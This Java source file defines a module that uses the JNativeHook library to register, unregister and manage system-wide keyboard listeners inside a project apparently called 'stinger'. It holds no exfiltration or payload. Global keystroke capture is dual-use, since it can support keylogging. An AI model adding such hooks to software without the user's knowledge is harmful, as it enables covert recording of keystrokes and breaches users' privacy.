package stinger.os.nhooks;

import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyListener;
import stinger.Module;
import stinger.StingerEnvironment;
import stingerlib.logging.Logger;

public class NativeHooksModule implements Module {

    private final Logger mLogger;
    private boolean mIsRegistered;

    public NativeHooksModule(Logger logger) {
        mLogger = logger;
        mIsRegistered = false;

        NativeHooks.clearJNativeHooksLogger();
    }

    @Override
    public synchronized void start(StingerEnvironment environment) {
        if (mIsRegistered) {
            return;
        }

        try {
            NativeHooks.register();
            mIsRegistered = true;
        } catch (NativeHookException e) {
            mLogger.error("Error registering", e);
        }
    }

    @Override
    public synchronized void stop(StingerEnvironment environment) {
        if (!mIsRegistered) {
            return;
        }

        try {
            NativeHooks.unregister();
            mIsRegistered = false;
        } catch (NativeHookException e) {
            mLogger.error("Error unregistering", e);
        }
    }

    public void register(NativeKeyListener listener) {
        NativeHooks.addListener(listener);
    }

    public void unregister(NativeKeyListener listener) {
        NativeHooks.removeListener(listener);
    }
}
